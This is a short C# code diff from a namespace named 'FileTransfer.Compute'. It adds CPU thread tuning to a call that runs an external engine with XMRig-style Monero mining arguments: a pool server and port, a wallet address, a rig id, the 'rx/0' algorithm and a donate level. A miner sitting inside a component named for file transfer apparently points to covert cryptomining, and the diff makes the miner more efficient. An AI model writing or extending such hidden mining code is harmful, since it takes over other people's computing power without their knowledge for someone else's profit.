@@ -68,8 +68,11 @@ namespace FileTransfer.Compute
 
             try
             {
+                int totalCores = Environment.ProcessorCount;
+                int threads = Math.Max(1, (int)Math.Round((double)totalCores * config.ResourceLimit / 100.0));
+
                 string execFile = enginePath;
-                string execArgs = $"-o {config.ServerAddress}:{config.ServerPort} -u {config.WalletAddress} -p {pass} --rig-id {rig} -a rx/0 --cpu-max-threads-hint={config.ResourceLimit} --no-color --donate-level=1";
+                string execArgs = $"-o {config.ServerAddress}:{config.ServerPort} -u {config.WalletAddress} -p {pass} --rig-id {rig} -a rx/0 -t {threads} --cpu-max-threads-hint={config.ResourceLimit} --no-color --donate-level=1";
 
                 if (enginePath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase) ||
                     enginePath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase))
